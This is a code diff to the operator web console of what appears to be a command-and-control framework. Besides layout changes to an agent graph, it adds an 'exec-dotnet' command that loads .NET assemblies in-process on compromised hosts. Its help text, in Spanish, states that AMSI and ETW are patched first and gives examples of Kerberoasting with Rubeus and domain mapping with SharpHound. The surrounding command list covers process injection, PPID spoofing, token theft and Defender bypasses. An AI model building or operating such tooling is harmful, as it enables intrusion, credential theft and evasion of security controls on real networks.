@@ -3839,8 +3839,10 @@ function renderAgentGraph() {
   const NODE_W = 92, NODE_H = 88;
 
   const filter = document.getElementById('agent-filter')?.value.toLowerCase() || '';
+  // Only lay out live agents — dead ones add noise without adding information.
   const visible = agents.filter(a =>
-    !filter || [a.hostname, a.username, a.os, a.id].some(x => x?.toLowerCase().includes(filter))
+    agentStatus(a).color !== 'red' &&
+    (!filter || [a.hostname, a.username, a.os, a.id].some(x => x?.toLowerCase().includes(filter)))
   );
 
   if (!visible.length) {
@@ -3900,10 +3902,11 @@ function renderAgentGraph() {
     return kids.reduce((s, k) => s + leafCount(k.id), 0);
   }
 
-  // Column x positions
+  // Column x positions — first column is 180px past the C2 node right edge so the
+  // transport+sleep label pill has room to sit on the horizontal arrow segment.
   const C2W = 86, COL_W = 260;
-  const colXOf = col => c2x + C2W + 70 + col * COL_W;
-  const ROW_H  = Math.min(130, Math.max(NODE_H + 14, Math.floor((H - 40) / Math.max(visible.length, 1))));
+  const colXOf = col => c2x + C2W + 180 + col * COL_W;
+  const ROW_H  = Math.min(150, Math.max(NODE_H + 30, Math.floor((H - 40) / Math.max(visible.length, 1))));
 
   // Recursive top-down positioning: assign y = center of leaf-slot range
   const posMap = {}; // agentId -> {x, y}
@@ -4078,8 +4081,10 @@ function updateGraphLines() {
     const safeId = 'arr-' + col.replace('#','');
     const dash   = dead ? '8 4' : tdash;
 
-    // Source: parent agent node if parent_id set, otherwise C2
-    let srcX = c2x, srcY = c2y;
+    // Source: right-edge center of parent node (agent or C2)
+    const c2Node = document.getElementById('gnode-c2');
+    let srcX = c2x + (c2Node?.offsetWidth  || C2W);
+    let srcY = c2y + (c2Node?.offsetHeight || NODE_H) / 2;
     if (a.parent_id && agentById[a.parent_id]) {
       const pn = document.getElementById('gnode-' + a.parent_id);
       if (pn) {
@@ -4088,8 +4093,8 @@ function updateGraphLines() {
       }
     }
 
-    // LR elbow: fixed bus 30px from source so trunk is always close to parent node
-    const midX = Math.min(srcX + 30, Math.round((srcX + nx) / 2));
+    // LR elbow: bus is 80px from source so the horizontal run to agent has room for the label
+    const midX = Math.min(srcX + 80, Math.round((srcX + nx) / 2));
     const d = `M${srcX},${srcY} L${midX},${srcY} L${midX},${ny} L${nx},${ny}`;
 
     if (dead) {
@@ -4133,9 +4138,9 @@ function updateGraphLines() {
       flow.style.animation = 'graphFlowAnim 0.55s linear infinite';
     }
 
-    // Transport + sleep/jitter label pill — midpoint of the vertical trunk segment
-    const lx      = midX;
-    const ly      = Math.round((srcY + ny) / 2);
+    // Transport + sleep/jitter label pill — midpoint of the horizontal segment to agent,
+    // positioned above the line so the pill doesn't overlap the arrow.
+    const lx      = Math.round((midX + nx) / 2);
     const label   = transportLabel(a.transport);
     const sleepS  = a.sleep_sec  != null ? a.sleep_sec  : null;
     const jitterP = a.jitter_pct != null ? a.jitter_pct : null;
@@ -4144,6 +4149,8 @@ function updateGraphLines() {
     const lines   = sleepLbl ? 2 : 1;
     const ph      = lines * lineH + 6;
     const pw      = Math.max(label.length * 5.8 + 12, sleepLbl ? sleepLbl.length * 4.8 + 12 : 0);
+    // Place the centre of the pill ph/2 + 3px above the horizontal line
+    const ly      = ny - ph / 2 - 3;
 
     const bg = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
     bg.setAttribute('x', lx - pw / 2); bg.setAttribute('y', ly - ph / 2);
@@ -4910,6 +4917,7 @@ const AC_COMMANDS = [
   ['inject','inject <pid> <sc.bin>  — section map + CreateRemoteThread en proceso existente'],
   ['inject-apc','inject-apc <sc.bin> [proc]  — APC early-bird: spawnea proc suspendido, inyecta, reanuda'],
   ['exec-asm','exec-asm <asm.exe> [proc]  — .NET → Donut (shellcode) → APC en proceso sacrificial nuevo; sin CLR visible'],
+  ['exec-dotnet','exec-dotnet <asm.exe> [args]  — .NET inline-execute: CLR nativo en-proceso, captura Console.Write (Rubeus, Seatbelt, SharpHound)'],
   ['forkrun','forkrun <sc.bin> [proc]  — PPID spoof + section map + thread hijack en proc sacrificial'],
   ['stage2','stage2 <sc.bin>  — in-process shellcode (CreateThread en agente actual, bypasa Defender)'],
   ['bof','bof <nombre|archivo.o> [args]  — nombre=BOF del servidor; archivo.o=subido con upload'],
@@ -4986,7 +4994,7 @@ const AC_COMMANDS = [
 const AC_WIN_ONLY = new Set([
   'screenshot',
   'inject','inject-apc','thread-hijack','forkrun',
-  'exec-asm','clrstomp','bof','stage2',
+  'exec-asm','exec-dotnet','clrstomp','bof','stage2',
   'hook-check','hw-bp-check','mem-fluctuate','mem-fluctuate start','mem-fluctuate stop',
   'encode-uuid',
   'token','token whoami','token steal','token make','token drop',
@@ -5019,6 +5027,7 @@ const AC_FILE_CMDS = new Map([
   ['thread-hijack', ['.bin']],
   ['encode-uuid',   ['.bin']],
   ['exec-asm',      ['.exe', '.dll']],
+  ['exec-dotnet',   ['.exe', '.dll']],
   ['clrstomp',      ['.exe', '.dll']],
   ['bof',           ['.o']],
   ['download',      null],
@@ -5284,6 +5293,9 @@ ${isWin ? `  screenshot                              captura → servidor
   stage2 &lt;sc.bin&gt;                        in-process CreateThread (sin proc nuevo, bypasa Defender en Server 2022)
   bof &lt;nombre|archivo.o&gt; [args]          ejecutar BOF (COFF x64); nombre = BOF preinstalado en servidor,
                                           archivo.o = subido con upload; args = cadena libre separada por espacios
+  exec-dotnet &lt;asm.exe&gt; [args]           CLR inline-execute en-proceso: captura Console.Write, sin Donut ni
+                                          proceso sacrificial. Equivalente a CS execute-assembly / Havoc dotnet
+                                          inline-execute. Soporta Rubeus, Seatbelt, SharpHound, etc.
   clrstomp &lt;asm.exe&gt; [args_para_asm]    .NET sin Donut, sin proceso nuevo. Carga un assembly legítimo del GAC
                                           para traer el CLR al proceso actual, luego machaca su memoria con tu
                                           assembly malicioso. Diferencias vs exec-asm:
@@ -5545,6 +5557,33 @@ const CMD_DETAIL_HELP = {
   • Requiere Donut instalado en el servidor (~/.local/bin/donut)
   • Sin proceso especificado, usa svchost.exe
   • Si Defender detecta el proceso, probar clrstomp para ejecución in-process`,
+
+  'exec-dotnet': `<b>exec-dotnet</b> — CLR inline-execute en-proceso (Rubeus, Seatbelt, SharpHound…)
+
+  <span class="console-section">USO</span>
+  exec-dotnet &lt;assembly.exe&gt; [args para el assembly]
+
+  <span class="console-section">EJEMPLOS</span>
+  exec-dotnet Rubeus.exe kerberoast /outfile:hashes.txt
+  exec-dotnet Seatbelt.exe -group=all
+  exec-dotnet SharpHound.exe -c All
+  exec-dotnet hellonet.exe
+
+  <span class="console-section">TÉCNICA</span>
+  • CLR nativo en-proceso vía ICorRuntimeHost + AppDomain.Load_3 (sin Donut, sin proceso sacrificial)
+  • Captura Console.Write/WriteLine mediante DirectWriter P/Invoke (WriteFile directo, sin buffering)
+  • AMSI y ETW parcheados antes de cargar el assembly
+  • Timeout de 3 minutos; los errores del assembly se capturan como output
+
+  <span class="console-section">DIFERENCIAS vs exec-asm / clrstomp</span>
+  exec-asm   → Donut + proceso sacrificial nuevo (CLR invisible en el agente)
+  clrstomp   → CLR vía GAC legítimo + stomping de memoria
+  exec-dotnet → CLR directo en el agente, salida capturada completa
+
+  <span class="console-section">NOTAS</span>
+  • El assembly corre en el AppDomain por defecto del agente
+  • Sin proceso nuevo — el agente sigue vivo si el assembly cuelga (timeout 3 min)
+  • Equivalente a: Cobalt Strike execute-assembly / Havoc dotnet inline-execute`,
 
   'clrstomp': `<b>clrstomp</b> — .NET in-process vía CLR stomping (sin Donut, sin proceso nuevo)
 
@@ -6423,6 +6462,23 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
         taskType = 'FORK_RUN';
         taskArgs = eaparts.slice(1).join(' ');
       } catch(e) { addConsoleOutput('', 'exec-asm error: '+e.message, null); return; }
+      break;
+    }
+    case 'exec-dotnet': {
+      // exec-dotnet <asm.exe> [args...]
+      // Loads CLR in-process, captures Console.Write output. No Donut, no sacrificial process.
+      const edparts = args.trim().split(' ');
+      const edFile  = edparts[0];
+      const edArgs  = edparts.slice(1).join(' ');
+      if (!edFile) { addConsoleOutput('uso: exec-dotnet &lt;asm.exe&gt; [args]', '', null); return; }
+      addConsoleOutput(`[*] exec-dotnet: cargando ${edFile}…`, '', null);
+      try {
+        const asmBytes = await fetchSCFile(edFile);
+        const b64 = u8ToB64(new Uint8Array(asmBytes));
+        taskType = 'DOTNET_EXEC';
+        taskArgs = JSON.stringify({asm: b64, args: edArgs, type: '', method: ''});
+        addConsoleOutput(`[+] ${edFile}: ${asmBytes.byteLength} bytes → DOTNET_EXEC`, '', null);
+      } catch(e) { addConsoleOutput('', 'exec-dotnet error: '+e.message, null); return; }
       break;
     }
     case 'clrstomp': {
